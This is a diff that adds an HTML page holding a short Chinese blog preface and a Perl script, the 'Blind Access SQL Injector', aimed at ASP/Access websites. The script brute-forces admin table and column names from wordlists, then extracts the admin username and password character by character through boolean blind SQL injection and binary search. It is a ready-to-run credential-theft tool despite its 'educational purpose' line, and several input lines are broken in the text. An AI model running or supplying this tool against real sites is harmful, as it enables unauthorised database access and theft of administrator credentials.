@@ -1,0 +1,435 @@
+<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type"content="text/html; charset=gb2312"/><title>Hello SyntaxHighlighter</title><script type="text/javascript"src="../K8codeHightLight/scripts/shCore.js"></script><script type="text/javascript"src="../K8codeHightLight/scripts/shBrushJScript.js"></script><link type="text/css"rel="stylesheet"href="../K8codeHightLight/styles/shCoreDefault.css"/><script type="text/javascript">SyntaxHighlighter.all();</script></head><body style="background: white; font-family: Helvetica"><pre class="brush: js;">最近找了个milw0rm风格的模板做了几个页面,主要是对博客一点都不简洁的东西有些忍受不了。
+还有就是要测试一些asp+access的网站,懒的开虚拟机去扫注射什么的,就把原来用C语言写的小程序,改进了判断注射的方法,增加了对COOKIE进行检测的功能,用着还比较顺手,轻量级的就是比较快也容易控制。然后稍微一改就写了个注射access的小脚本,也没什么用纯属娱乐。
+下载地址:http://www.cli5.com/paper/38
+
+#!/usr/bin/perl
+# blind access sqlinjector [GET Method]
+# for educational purpose only!
+# Code by c4rp3nt3r@0x50sec.org
+#其实没多大作用
+
+use POSIX;
+use LWP::UserAgent;
+
+#######!!!!!!SET THE FOLLOWING TWO LINES
+$target ="http://www.cli5.com/exploit.asp?id=111";
+$turestr='2011-1-1';
+#######!!!!!!
+
+$comstr="";		#%00
+$nullstr="+";	#%20 %09 %0a 
+
+print "\n";
+print "\t|=-----------------------------------------=|\n";
+print "\t|=---[ Blind Access SQL Injector V1.0 ]----=|\n";
+print "\t|=-------[ c4rp3nt3r\@0x50sec.org ]---------=|\n";
+print "\t|=-----------------------------------------=|\n\n";
+
+main();
+
+sub main
+{
+
+	print 'Choose a number to be execute:
+	[a] fuzz table_name
+	[b] fuzz column_name
+	[c] sql (Dump data)
+	';
+	print "\n";
+	print "Choose a number#";
+	$xnum= ; chomp $xnum;
+
+	if($xnum eq 'a')
+	{
+		fuzz_tb();
+	}elsif($xnum eq 'b')
+	{
+		print "Enter The table name to fuzz the column#";
+		$sql_stdin= ; chomp $sql_stdin;
+		fuzz_pwd_usr_clm($sql_stdin);
+	}elsif($xnum eq 'c')
+	{
+		print "Enter The admin table name#";
+		$t_admin = ; chomp $t_admin;
+		print "Enter the user column name#";
+		$t_user = ; chomp $t_user;
+		print "Enter the pass column name#";
+		$t_pass = ; chomp $t_pass;
+		dump_fuzz_half($t_admin,$t_user,$t_pass);
+	}
+
+}
+
+#################
+sub fuzz_tb
+{
+print "[*] Fuzz admin table name...\n";
+$xsql = $nullstr.'aND(SeLEcT'.$nullstr.'CoUNt(*)'.$nullstr.'fRoM';#.think_md5hash)>0--
+
+#print "$sql\n\007\n";
+@ok_tbname=();
+$long=@ok_tbname;
+
+#print "[*] Guess table name...\n\n";
+@tables=(
+'admin',
+'admins',
+'users',
+'user',
+'usr_pw',
+'salt',
+'members',
+'mysql.user',
+'think_md5hash',
+'hash',
+'login',
+'log_user',
+'admin_user',
+'adminuser',
+'member_admin',
+'AdminUsers',
+'administrables',
+'administrateur',
+'administrateurs',
+'login_admin',
+'login_admins',
+'login_user',
+'login_users',
+'lost_pass',
+'lost_passwords',
+'lostpass',
+'lostpasswords',
+'stnuser',
+'stuser',
+'stusers',
+'stuseres',
+'staff',
+'u_name',
+'u_p',
+'u_pass',
+'Benutzer',
+'usercontrol',
+'user_pw',
+'Benutzerliste',
+'userlogins',
+'userpasswd',
+'admuser',
+'system',
+'adm',
+'tb_user',
+'x_admin',
+'m_admin',
+'manage',
+'member',
+'tbl_user',
+'tbl_users',
+'tbl_admin',
+'tbl_admins',
+'tbl_member',
+'tbl_members',
+'tbladmins',
+'admin_user',
+'admin_userinfo',
+'administrator',
+'adminid',
+'admin_id',
+'adminuserid',
+'admin_userid',
+'AdminUID',
+'adminusername',
+'admin_username',
+'adminname',
+'admin_name',
+'wp_users',
+);
+	foreach $tbname(@tables)
+	{
+		$final=$target.$xsql.$nullstr.$tb_prefix.$tbname.')'.$comstr;
+		$ua =  new LWP::UserAgent or die;
+		$ua->timeout(35);
+		$ua->proxy("http", "http://$proxy/") if defined($proxy);
+		$tbres = $ua->get($final);
+		print "[*] Fuzz table name [$tbname]"."\n";
+		#print $final."\n";
+		if($tbres->content =~ /$turestr/)
+		{
+			$result=$result."[+] Found ->".$tbname."\n\n";
+			print " \n[+] Found table_name-> [$tbname]"."\n\n";
+			$long=@ok_tbname;
+			@ok_tbname[$long]=$tbname;	#将存在的表名放到一个数组里
+		}
+	}
+
+}
+
+sub fuzz_pwd_usr_clm
+{
+my($xok_tbname)=@_;
+
+##-------
+@usrclms=(
+'username',
+'user_name',
+'user',
+'login',
+'admin',
+'adminname',
+'admin_id',
+'usr',
+'name',
+'u_name',
+'administrators',
+'administrator',
+'adminuser',
+'adminname',
+'admin_name',
+'admin_user',
+'admin_username',
+'user_admin',
+'user_n',
+'user_un',
+'user_uname',
+'user_username',
+'user_usernm',
+'user_usernun',
+'user_usrnm',
+'usr',
+'email',
+'mail',
+'usr_n',
+'usr_name',
+'usr_pass',
+'usr2',
+'usrn',
+'usrnam',
+'usrname',
+'usrnm',
+'adminusername',
+'bbsuser',
+'bbsid',
+'bbsusername',
+'permission',
+'access',
+'accnt',
+'accnts',
+'account',
+'accounts',
+'qq',
+'帐号',
+'管理员',
+'权限',
+'用户名',
+'会员',
+'用户帐号',
+);
+@pwdclms=(
+'password',
+'pwd',
+'userpass',
+'pass',
+'psw',
+'userpwd',
+'userpw',
+'psd',
+'pw',
+'user_pass',
+'admin_password',
+'PassWD',
+'user_password',
+'uPassword',
+'user_pwd',
+'adminpwd',
+'admin_pass',
+'admin_password',
+'login_pass',
+'login_passwd',
+'login_password',
+'login_pw',
+'login_pwd',
+'login_user',
+'login_username',
+'adminpsw',
+'adminupass',
+'user_pass',
+'user_passw',
+'user_passwd',
+'user_pw',
+'user_pwd',
+'user_pword',
+'pword',
+'user_pwrd',
+'密码',
+'用户密码',
+'编号',
+);
+
+	print "\n[*] Fuzz user column name...\n\n";
+	my $ua = new LWP::UserAgent or die;
+	$i=0;
+	$ua -> agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920	Firefox/3.0.4");
+	foreach $usr_clm(@usrclms)
+	{
+
+		$xsql = $nullstr.'aND(SeLEcT'.$nullstr.'CoUNt('.$usr_clm.')'.$nullstr.'fRoM'.$nullstr.$xok_tbname.')'.$comstr;#.think_md5hash)>0--
+		$final=$target.$xsql;
+		$tbres = $ua->get($final);
+		print "[*] Fuzz [$usr_clm] from $xok_tbname \n";
+		#print $final."\n";
+		if($tbres->content =~ /$turestr/)
+		{	$result=$result."[+] Found column_name->"."[$usr_clm]"." from table_name->"."[$xok_tbname]"."\n";
+			print "\n[+] Found column_name->"."[$usr_clm]"." from table_name->"."[$xok_tbname]"."\n\n";
+			$usr=$usr_clm;
+			last;
+		}
+	}
+
+	print "\n[*] Fuzz password column name...\n\n";
+	foreach $pwd_clm(@pwdclms)
+	{
+		$xsql = $nullstr.'aND(SeLEcT'.$nullstr.'CoUNt('.$pwd_clm.')'.$nullstr.'fRoM'.$nullstr.$xok_tbname.')'.$comstr;#.think_md5hash)>0--
+		$final=$target.$xsql;
+
+		$tbres = $ua->get($final);
+		print "[*] Fuzz [$pwd_clm] from [$xok_tbname] \n";
+		#print $final."\n";
+		if($tbres->content =~ /$turestr/)
+		{	$result=$result."[+] Found column_name->"."[$pwd_clm]"." from table_name->"."[$xok_tbname]"."\n";
+			print "\n[+] Found column_name->"."[$pwd_clm]"." from table_name->"."[$xok_tbname]"."\n\n";
+			$pwd=$pwd_clm;
+			last;
+		}
+	}
+
+	print "[+] Found column_name->"." [$usr] [$pwd] "." from table_name->"."[$xok_tbname]"."\n\n";
+}
+
+#################################
+sub dump_fuzz_half
+{
+	$|=1;	# 立即刷新缓冲区输出内容
+	my($xok_tbname,$usr,$pwd) = @_; 
+
+	$fuzzsql="seleCt".$nullstr."count(*)".$nullstr.'from'.$nullstr.$xok_tbname;
+	print "[*]$fuzzsql:\n";
+	$count = fuzz_half($fuzzsql,0,45);
+	if($count<=0)
+	{
+		print "[-]Count(*) of $xok_tbname is less than zero!\n";
+		exit;
+	}else
+	{
+		print "[+]Count(*) of $xok_tbname is: [$count]\n";
+	}
+
+	$fuzzsql="seleCt".$nullstr.'top'.$nullstr.'1'.$nullstr."len($usr)".$nullstr.'from'.$nullstr.$xok_tbname;
+	print "[*]$fuzzsql:\n";
+	$len = fuzz_half($fuzzsql,0,45);
+	if($len<=0)
+	{
+		print "[-]Length of top 1 $usr is less than zero!\n";
+		exit;
+	}else
+	{
+		print "[+]Length of top 1 $usr is: [$len]\n";
+	}
+	@okusr=();
+	@okpwd=();
+	printf("[+]SeleCt top 1 [$usr] from [$xok_tbname]: ");
+	for($subset=1;$subset<=$len;$subset++)
+	{
+		$fuzzsql='seleCt'.$nullstr.'top'.$nullstr.'1'.$nullstr."asc(mid($usr,$subset,1))".$nullstr.'frOm'.$nullstr.$xok_tbname;
+		$long=@okusr;
+		$ret=fuzz_half($fuzzsql,0,127);
+		@okusr[$long]=$ret;
+		printf("%c",$ret);
+	}
+	print "\n[";
+	foreach $xoktbnum(@okusr)
+	{
+		printf("%c",$xoktbnum);
+	}
+	print "]\n";
+
+	$fuzzsql='seleCt'.$nullstr.'top'.$nullstr.'1'.$nullstr."len($pwd)".$nullstr.'from'.$nullstr.$xok_tbname;
+	print "[*]$fuzzsql:\n";
+	$len = fuzz_half($fuzzsql,0,45);
+	if($len<=0)
+	{
+		print "[-]Length of top 1 $pwd is less than zero!\n";
+		exit;
+	}else
+	{
+		print "[+]Length of top 1 $pwd is: [$len]\n";
+	}
+	printf("[+]SeleCt top 1 [$pwd] from [$xok_tbname]: ");
+	for($subset=1;$subset<=$len;$subset++)
+	{
+		$fuzzsql='seleCt'.$nullstr.'top'.$nullstr.'1'.$nullstr."asc(mid($pwd,$subset,1))".$nullstr.'frOm'.$nullstr.$xok_tbname;
+		$long=@okpwd;
+		$ret=fuzz_half($fuzzsql,0,127);
+		@okpwd[$long]=$ret;
+		printf("%c",$ret);
+	}
+	print "\n[";
+
+	foreach $xoktbnum(@okpwd)
+	{
+		printf("%c",$xoktbnum);
+	}
+	print "]\n\n";
+	$fuzzsql="seleCt".$nullstr.'top'.$nullstr.'1'.$nullstr."$usr,$pwd".$nullstr.'from'.$nullstr.$xok_tbname;
+	printf "[+]$fuzzsql:\n";
+	print "[$usr] : ";
+	foreach $xoktbnum(@okusr)
+	{
+		printf("%c",$xoktbnum);
+	}
+	print "\n";
+	print "[$pwd] : ";
+	foreach $xoktbnum(@okpwd)
+	{
+		printf("%c",$xoktbnum);
+	}
+	print "\n\n";
+
+}
+
+##################################
+sub fuzz_half	#order by语句递归查询函数采用折半法
+{
+    #($min,$max)区间代表一个范围,正确的字段数在其中我们折半缩小之直到找到正确字段数
+    #$min 代表能够正常显示的已经确定的最小整数
+    #$max 代表不能够正常显示的已经确定的最小整数,作为我们可以确定的范围的最大数所以叫其"max"
+    my ($sql,$min,$max) = @_;
+    $x_fuzzsql=$sql;
+    if($max==0&&$min==0)
+    {
+		return 0;
+    }
+    if($max-$min==1)#如果能正常显示的最小整数比不能正常显示的最小整数大一那么最小的数$min
+    {				#就是要找的正确字段数目退出递归函数返回之
+    	return $max;
+    }
+	#如果上面条件没成立就取范围中间的数字作为order by查询字段数
+	my $mid=int(($min+$max)/2);#取两个正整数的平均值
+	#print "max:$max,min:$min,mid=$mid\n";
+	$final=$nullstr."AnD"."($sql)>";
+	$final = $target.$final.$mid.$comstr;
+	#print "[*] Test ($sql)>$mid...\n";
+	#print $final."\n";
+	my $lwp = new LWP::UserAgent or die;
+	$lwp -> agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4");
+	my $res = $lwp->get($final);
+	my $myres=$res->content; #for test
+	if($res->content =~ /$turestr/)
+	{
+		$min=$mid;
+		fuzz_half($sql,$min,$max);
+	}
+	else
+	{
+		$max=$mid;
+		fuzz_half($sql,$min,$max);
+	}
+}
+</pre></html>
